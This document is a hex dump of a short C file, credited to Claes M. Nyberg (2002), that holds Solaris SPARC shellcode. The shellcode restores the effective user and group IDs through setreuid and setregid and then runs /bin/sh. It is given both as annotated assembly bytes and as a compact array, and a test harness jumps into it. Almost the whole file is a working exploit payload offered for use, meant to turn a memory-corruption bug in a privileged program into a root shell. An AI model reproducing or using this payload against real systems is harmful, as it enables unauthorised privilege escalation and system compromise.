00000000  2f 2a 0d 0a 20 2a 20 53  6f 6c 61 72 69 73 20 73  |/*.. * Solaris s|
00000010  68 65 6c 6c 63 6f 64 65  20 2d 20 73 65 74 72 65  |hellcode - setre|
00000020  75 69 64 28 67 65 74 65  75 69 64 28 29 29 2c 20  |uid(geteuid()), |
00000030  73 65 74 72 65 67 69 64  28 67 65 74 65 67 69 64  |setregid(getegid|
00000040  28 29 29 2c 20 65 78 65  63 76 65 20 2f 62 69 6e  |()), execve /bin|
00000050  2f 73 68 0d 0a 20 2a 0d  0a 20 2a 20 43 6c 61 65  |/sh.. *.. * Clae|
00000060  73 20 4d 2e 20 4e 79 62  65 72 67 20 32 30 30 32  |s M. Nyberg 2002|
00000070  30 31 32 34 0d 0a 20 2a  20 2c 20 20 0d 0a 20 2a  |0124.. * ,  .. *|
00000080  2f 0d 0a 0d 0a 23 69 6e  63 6c 75 64 65 20 0d 0a  |/....#include ..|
00000090  0d 0a 73 74 61 74 69 63  20 63 68 61 72 20 73 6f  |..static char so|
000000a0  6c 61 72 69 73 5f 63 6f  64 65 5b 5d 20 3d 0d 0a  |laris_code[] =..|
000000b0  20 20 20 20 20 20 20 20  20 20 20 20 0d 0a 20 20  |            ..  |
000000c0  20 20 20 20 20 20 20 20  20 20 2f 2a 20 67 65 74  |          /* get|
000000d0  65 75 69 64 28 29 20 2a  2f 0d 0a 20 20 20 20 22  |euid() */..    "|
000000e0  5c 78 38 32 5c 78 31 30  5c 78 32 30 5c 78 31 38  |\x82\x10\x20\x18|
000000f0  22 20 20 20 2f 2a 20 6d  6f 76 20 20 20 20 20 32  |"   /* mov     2|
00000100  34 2c 20 25 67 31 20 20  20 20 20 20 20 20 20 20  |4, %g1          |
00000110  20 20 20 20 2a 2f 0d 0a  20 20 20 20 22 5c 78 39  |    */..    "\x9|
00000120  31 5c 78 64 30 5c 78 32  30 5c 78 30 38 22 20 20  |1\xd0\x20\x08"  |
00000130  20 2f 2a 20 74 61 20 20  20 20 20 20 30 78 38 20  | /* ta      0x8 |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000150  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 39 30 5c 78  | */..    "\x90\x|
00000160  30 32 5c 78 36 30 5c 78  30 31 22 20 20 20 2f 2a  |02\x60\x01"   /*|
00000170  20 61 64 64 20 20 20 20  20 25 6f 31 2c 20 31 2c  | add     %o1, 1,|
00000180  20 25 6f 30 20 20 20 20  20 20 20 20 20 20 2a 2f  | %o0          */|
00000190  0d 0a 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |....            |
000001a0  2f 2a 20 73 65 74 72 65  75 69 64 28 29 20 2a 2f  |/* setreuid() */|
000001b0  0d 0a 20 20 20 20 22 5c  78 39 30 5c 78 32 32 5c  |..    "\x90\x22\|
000001c0  78 32 30 5c 78 30 31 22  20 20 20 2f 2a 20 73 75  |x20\x01"   /* su|
000001d0  62 20 20 20 20 20 25 6f  30 2c 20 31 2c 20 25 6f  |b     %o0, 1, %o|
000001e0  30 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 20  |0          */.. |
000001f0  20 20 20 22 5c 78 39 32  5c 78 31 30 5c 78 33 66  |   "\x92\x10\x3f|
00000200  5c 78 66 66 22 20 20 20  2f 2a 20 6d 6f 76 20 20  |\xff"   /* mov  |
00000210  20 20 20 2d 31 2c 20 25  6f 31 20 20 20 20 20 20  |   -1, %o1      |
00000220  20 20 20 20 20 20 20 20  2a 2f 0d 0a 20 20 20 20  |        */..    |
00000230  22 5c 78 38 32 5c 78 31  30 5c 78 32 30 5c 78 63  |"\x82\x10\x20\xc|
00000240  61 22 20 20 20 2f 2a 20  6d 6f 76 20 20 20 20 20  |a"   /* mov     |
00000250  32 30 32 2c 20 25 67 31  20 20 20 20 20 20 20 20  |202, %g1        |
00000260  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 22 5c 78  |     */..    "\x|
00000270  39 31 5c 78 64 30 5c 78  32 30 5c 78 30 38 22 20  |91\xd0\x20\x08" |
00000280  20 20 2f 2a 20 74 61 20  20 20 20 20 20 30 78 38  |  /* ta      0x8|
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002a0  20 20 2a 2f 0d 0a 0d 0a  20 20 20 20 20 20 20 20  |  */....        |
000002b0  20 20 20 20 2f 2a 20 67  65 74 65 67 69 64 28 29  |    /* getegid()|
000002c0  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 38 32 5c 78  | */..    "\x82\x|
000002d0  31 30 5c 78 32 30 5c 78  32 66 22 20 20 20 2f 2a  |10\x20\x2f"   /*|
000002e0  20 6d 6f 76 20 20 20 20  20 34 37 2c 20 25 67 31  | mov     47, %g1|
000002f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 2f  |              */|
00000300  0d 0a 20 20 20 20 22 5c  78 39 31 5c 78 64 30 5c  |..    "\x91\xd0\|
00000310  78 32 30 5c 78 30 38 22  20 20 20 2f 2a 20 74 61  |x20\x08"   /* ta|
00000320  20 20 20 20 20 20 30 78  38 20 20 20 20 20 20 20  |      0x8       |
00000330  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 20  |           */.. |
00000340  20 20 20 22 5c 78 39 30  5c 78 30 32 5c 78 36 30  |   "\x90\x02\x60|
00000350  5c 78 30 31 22 20 20 20  2f 2a 20 61 64 64 20 20  |\x01"   /* add  |
00000360  20 20 20 25 6f 31 2c 20  31 2c 20 25 6f 30 20 20  |   %o1, 1, %o0  |
00000370  20 20 20 20 20 20 20 20  2a 2f 0d 0a 0d 0a 20 20  |        */....  |
00000380  20 20 20 20 20 20 20 20  20 20 2f 2a 20 73 65 74  |          /* set|
00000390  72 65 67 69 64 28 29 20  2a 2f 0d 0a 20 20 20 20  |regid() */..    |
000003a0  22 5c 78 39 30 5c 78 32  32 5c 78 32 30 5c 78 30  |"\x90\x22\x20\x0|
000003b0  31 22 20 20 20 2f 2a 20  73 75 62 20 20 20 20 20  |1"   /* sub     |
000003c0  25 6f 30 2c 20 31 2c 20  25 6f 30 20 20 20 20 20  |%o0, 1, %o0     |
000003d0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 22 5c 78  |     */..    "\x|
000003e0  39 32 5c 78 31 30 5c 78  33 66 5c 78 66 66 22 20  |92\x10\x3f\xff" |
000003f0  20 20 2f 2a 20 6d 6f 76  20 20 20 20 20 2d 31 2c  |  /* mov     -1,|
00000400  20 25 6f 31 20 20 20 20  20 20 20 20 20 20 20 20  | %o1            |
00000410  20 20 2a 2f 0d 0a 20 20  20 20 22 5c 78 38 32 5c  |  */..    "\x82\|
00000420  78 31 30 5c 78 32 30 5c  78 63 62 22 20 20 20 2f  |x10\x20\xcb"   /|
00000430  2a 20 6d 6f 76 20 20 20  20 20 32 30 33 2c 20 25  |* mov     203, %|
00000440  67 31 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |g1             *|
00000450  2f 0d 0a 20 20 20 20 22  5c 78 39 31 5c 78 64 30  |/..    "\x91\xd0|
00000460  5c 78 32 30 5c 78 30 38  22 20 20 20 2f 2a 20 74  |\x20\x08"   /* t|
00000470  61 20 20 20 20 20 20 30  78 38 20 20 20 20 20 20  |a      0x8      |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
00000490  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |..            /*|
000004a0  20 65 78 65 63 76 65 28  2f 62 69 6e 2f 73 68 20  | execve(/bin/sh |
000004b0  2e 2e 29 20 2a 2f 0d 0a  20 20 20 20 22 5c 78 39  |..) */..    "\x9|
000004c0  34 5c 78 31 61 5c 78 38  30 5c 78 30 61 22 20 20  |4\x1a\x80\x0a"  |
000004d0  20 2f 2a 20 78 6f 72 20  20 20 20 20 25 6f 32 2c  | /* xor     %o2,|
000004e0  20 25 6f 32 2c 20 25 6f  32 20 20 20 20 20 20 20  | %o2, %o2       |
000004f0  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 32 31 5c 78  | */..    "\x21\x|
00000500  30 62 5c 78 64 38 5c 78  39 61 22 20 20 20 2f 2a  |0b\xd8\x9a"   /*|
00000510  20 73 65 74 68 69 20 20  20 25 68 69 28 30 78 32  | sethi   %hi(0x2|
00000520  66 36 32 36 38 30 30 29  2c 20 25 6c 30 20 2a 2f  |f626800), %l0 */|
00000530  0d 0a 20 20 20 20 22 5c  78 61 30 5c 78 31 34 5c  |..    "\xa0\x14\|
00000540  78 32 31 5c 78 36 65 22  20 20 20 2f 2a 20 6f 72  |x21\x6e"   /* or|
00000550  20 20 20 20 20 20 25 6c  30 2c 20 30 78 31 36 65  |      %l0, 0x16e|
00000560  2c 20 25 6c 30 20 20 20  20 20 20 2a 2f 0d 0a 20  |, %l0      */.. |
00000570  20 20 20 22 5c 78 32 33  5c 78 30 62 5c 78 63 62  |   "\x23\x0b\xcb|
00000580  5c 78 64 63 22 20 20 20  2f 2a 20 73 65 74 68 69  |\xdc"   /* sethi|
00000590  20 20 20 25 68 69 28 30  78 32 66 32 66 37 30 30  |   %hi(0x2f2f700|
000005a0  30 29 2c 20 25 6c 31 20  2a 2f 0d 0a 20 20 20 20  |0), %l1 */..    |
000005b0  22 5c 78 61 32 5c 78 31  34 5c 78 36 33 5c 78 36  |"\xa2\x14\x63\x6|
000005c0  38 22 20 20 20 2f 2a 20  6f 72 20 20 20 20 20 20  |8"   /* or      |
000005d0  25 6c 31 2c 20 30 78 33  36 38 2c 20 25 6c 31 20  |%l1, 0x368, %l1 |
000005e0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 22 5c 78  |     */..    "\x|
000005f0  64 34 5c 78 32 33 5c 78  62 66 5c 78 66 63 22 20  |d4\x23\xbf\xfc" |
00000600  20 20 2f 2a 20 73 74 20  20 20 20 20 20 25 6f 32  |  /* st      %o2|
00000610  2c 20 5b 25 73 70 20 2d  20 34 5d 20 20 20 20 20  |, [%sp - 4]     |
00000620  20 20 2a 2f 0d 0a 20 20  20 20 22 5c 78 65 32 5c  |  */..    "\xe2\|
00000630  78 32 33 5c 78 62 66 5c  78 66 38 22 20 20 20 2f  |x23\xbf\xf8"   /|
00000640  2a 20 73 74 20 20 20 20  20 20 25 6c 31 2c 20 5b  |* st      %l1, [|
00000650  25 73 70 20 2d 20 38 5d  20 20 20 20 20 20 20 2a  |%sp - 8]       *|
00000660  2f 0d 0a 20 20 20 20 22  5c 78 65 30 5c 78 32 33  |/..    "\xe0\x23|
00000670  5c 78 62 66 5c 78 66 34  22 20 20 20 2f 2a 20 73  |\xbf\xf4"   /* s|
00000680  74 20 20 20 20 20 20 25  6c 30 2c 20 5b 25 73 70  |t      %l0, [%sp|
00000690  20 2d 20 31 32 5d 20 20  20 20 20 20 2a 2f 0d 0a  | - 12]      */..|
000006a0  20 20 20 20 22 5c 78 39  30 5c 78 32 33 5c 78 61  |    "\x90\x23\xa|
000006b0  30 5c 78 30 63 22 20 20  20 2f 2a 20 73 75 62 20  |0\x0c"   /* sub |
000006c0  20 20 20 20 25 73 70 2c  20 31 32 2c 20 25 6f 30  |    %sp, 12, %o0|
000006d0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
000006e0  20 22 5c 78 64 34 5c 78  32 33 5c 78 62 66 5c 78  | "\xd4\x23\xbf\x|
000006f0  66 30 22 20 20 20 2f 2a  20 73 74 20 20 20 20 20  |f0"   /* st     |
00000700  20 25 6f 32 2c 20 5b 25  73 70 20 2d 20 31 36 5d  | %o2, [%sp - 16]|
00000710  20 20 20 20 20 20 2a 2f  0d 0a 20 20 20 20 22 5c  |      */..    "\|
00000720  78 64 30 5c 78 32 33 5c  78 62 66 5c 78 65 63 22  |xd0\x23\xbf\xec"|
00000730  20 20 20 2f 2a 20 73 74  20 20 20 20 20 20 25 6f  |   /* st      %o|
00000740  30 2c 20 5b 25 73 70 20  2d 20 32 30 5d 20 20 20  |0, [%sp - 20]   |
00000750  20 20 20 2a 2f 0d 0a 20  20 20 20 22 5c 78 39 32  |   */..    "\x92|
00000760  5c 78 32 33 5c 78 61 30  5c 78 31 34 22 20 20 20  |\x23\xa0\x14"   |
00000770  2f 2a 20 73 75 62 20 20  20 20 20 25 73 70 2c 20  |/* sub     %sp, |
00000780  32 30 2c 20 25 6f 31 20  20 20 20 20 20 20 20 20  |20, %o1         |
00000790  2a 2f 0d 0a 20 20 20 20  22 5c 78 38 32 5c 78 31  |*/..    "\x82\x1|
000007a0  30 5c 78 32 30 5c 78 33  62 22 20 20 20 2f 2a 20  |0\x20\x3b"   /* |
000007b0  6d 6f 76 20 20 20 20 20  35 39 2c 20 25 67 31 20  |mov     59, %g1 |
000007c0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
000007d0  0a 20 20 20 20 22 5c 78  39 31 5c 78 64 30 5c 78  |.    "\x91\xd0\x|
000007e0  32 30 5c 78 30 38 22 20  20 20 2f 2a 20 74 61 20  |20\x08"   /* ta |
000007f0  20 20 20 20 20 30 78 38  20 20 20 20 20 20 20 20  |     0x8        |
00000800  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 0d 0a  |          */....|
00000810  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 65  |            /* e|
00000820  78 69 74 28 29 20 2a 2f  0d 0a 20 20 20 20 22 5c  |xit() */..    "\|
00000830  78 38 32 5c 78 31 30 5c  78 32 30 5c 78 30 31 22  |x82\x10\x20\x01"|
00000840  20 20 20 2f 2a 20 6d 6f  76 20 20 20 20 20 31 2c  |   /* mov     1,|
00000850  20 25 67 31 20 20 20 20  20 20 20 20 20 20 20 20  | %g1            |
00000860  20 20 20 2a 2f 0d 0a 20  20 20 20 22 5c 78 39 31  |   */..    "\x91|
00000870  5c 78 64 30 5c 78 32 30  5c 78 30 38 22 3b 20 20  |\xd0\x20\x08";  |
00000880  2f 2a 20 74 61 20 20 20  20 20 20 30 78 38 20 20  |/* ta      0x8  |
00000890  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008a0  2a 2f 0d 0a 0d 0a 0d 0a  73 74 61 74 69 63 20 63  |*/......static c|
000008b0  68 61 72 20 5f 73 6f 6c  61 72 69 73 5f 63 6f 64  |har _solaris_cod|
000008c0  65 5b 5d 20 3d 0d 0a 09  22 5c 78 38 32 5c 78 31  |e[] =..."\x82\x1|
000008d0  30 5c 78 32 30 5c 78 31  38 5c 78 39 31 5c 78 64  |0\x20\x18\x91\xd|
000008e0  30 5c 78 32 30 5c 78 30  38 5c 78 39 30 5c 78 30  |0\x20\x08\x90\x0|
000008f0  32 5c 78 36 30 5c 78 30  31 5c 78 39 30 5c 78 32  |2\x60\x01\x90\x2|
00000900  32 22 0d 0a 09 22 5c 78  32 30 5c 78 30 31 5c 78  |2"..."\x20\x01\x|
00000910  39 32 5c 78 31 30 5c 78  33 66 5c 78 66 66 5c 78  |92\x10\x3f\xff\x|
00000920  38 32 5c 78 31 30 5c 78  32 30 5c 78 63 61 5c 78  |82\x10\x20\xca\x|
00000930  39 31 5c 78 64 30 5c 78  32 30 5c 78 30 38 22 0d  |91\xd0\x20\x08".|
00000940  0a 09 22 5c 78 38 32 5c  78 31 30 5c 78 32 30 5c  |.."\x82\x10\x20\|
00000950  78 32 66 5c 78 39 31 5c  78 64 30 5c 78 32 30 5c  |x2f\x91\xd0\x20\|
00000960  78 30 38 5c 78 39 30 5c  78 30 32 5c 78 36 30 5c  |x08\x90\x02\x60\|
00000970  78 30 31 5c 78 39 30 5c  78 32 32 22 0d 0a 09 22  |x01\x90\x22"..."|
00000980  5c 78 32 30 5c 78 30 31  5c 78 39 32 5c 78 31 30  |\x20\x01\x92\x10|
00000990  5c 78 33 66 5c 78 66 66  5c 78 38 32 5c 78 31 30  |\x3f\xff\x82\x10|
000009a0  5c 78 32 30 5c 78 63 62  5c 78 39 31 5c 78 64 30  |\x20\xcb\x91\xd0|
000009b0  5c 78 32 30 5c 78 30 38  22 0d 0a 09 22 5c 78 39  |\x20\x08"..."\x9|
000009c0  34 5c 78 31 61 5c 78 38  30 5c 78 30 61 5c 78 32  |4\x1a\x80\x0a\x2|
000009d0  31 5c 78 30 62 5c 78 64  38 5c 78 39 61 5c 78 61  |1\x0b\xd8\x9a\xa|
000009e0  30 5c 78 31 34 5c 78 32  31 5c 78 36 65 5c 78 32  |0\x14\x21\x6e\x2|
000009f0  33 5c 78 30 62 22 0d 0a  09 22 5c 78 63 62 5c 78  |3\x0b"..."\xcb\x|
00000a00  64 63 5c 78 61 32 5c 78  31 34 5c 78 36 33 5c 78  |dc\xa2\x14\x63\x|
00000a10  36 38 5c 78 64 34 5c 78  32 33 5c 78 62 66 5c 78  |68\xd4\x23\xbf\x|
00000a20  66 63 5c 78 65 32 5c 78  32 33 5c 78 62 66 5c 78  |fc\xe2\x23\xbf\x|
00000a30  66 38 22 0d 0a 09 22 5c  78 65 30 5c 78 32 33 5c  |f8"..."\xe0\x23\|
00000a40  78 62 66 5c 78 66 34 5c  78 39 30 5c 78 32 33 5c  |xbf\xf4\x90\x23\|
00000a50  78 61 30 5c 78 30 63 5c  78 64 34 5c 78 32 33 5c  |xa0\x0c\xd4\x23\|
00000a60  78 62 66 5c 78 66 30 5c  78 64 30 5c 78 32 33 22  |xbf\xf0\xd0\x23"|
00000a70  0d 0a 09 22 5c 78 62 66  5c 78 65 63 5c 78 39 32  |..."\xbf\xec\x92|
00000a80  5c 78 32 33 5c 78 61 30  5c 78 31 34 5c 78 38 32  |\x23\xa0\x14\x82|
00000a90  5c 78 31 30 5c 78 32 30  5c 78 33 62 5c 78 39 31  |\x10\x20\x3b\x91|
00000aa0  5c 78 64 30 5c 78 32 30  5c 78 30 38 22 0d 0a 09  |\xd0\x20\x08"...|
00000ab0  22 5c 78 38 32 5c 78 31  30 5c 78 32 30 5c 78 30  |"\x82\x10\x20\x0|
00000ac0  31 5c 78 39 31 5c 78 64  30 5c 78 32 30 5c 78 30  |1\x91\xd0\x20\x0|
00000ad0  38 22 3b 0d 0a 0d 0a 69  6e 74 0d 0a 6d 61 69 6e  |8";....int..main|
00000ae0  28 76 6f 69 64 29 0d 0a  7b 0d 0a 20 20 20 20 76  |(void)..{..    v|
00000af0  6f 69 64 20 28 2a 63 6f  64 65 29 28 29 20 3d 20  |oid (*code)() = |
00000b00  28 76 6f 69 64 20 2a 29  5f 73 6f 6c 61 72 69 73  |(void *)_solaris|
00000b10  5f 63 6f 64 65 3b 0d 0a  20 20 20 20 70 72 69 6e  |_code;..    prin|
00000b20  74 66 28 22 53 68 65 6c  6c 63 6f 64 65 20 6c 65  |tf("Shellcode le|
00000b30  6e 67 74 68 3a 20 25 64  5c 6e 22 2c 20 73 74 72  |ngth: %d\n", str|
00000b40  6c 65 6e 28 5f 73 6f 6c  61 72 69 73 5f 63 6f 64  |len(_solaris_cod|
00000b50  65 29 29 3b 0d 0a 20 20  20 20 63 6f 64 65 28 29  |e));..    code()|
00000b60  3b 0d 0a 20 20 20 20 72  65 74 75 72 6e 28 31 29  |;..    return(1)|
00000b70  3b 0d 0a 7d                                       |;..}|
00000b74
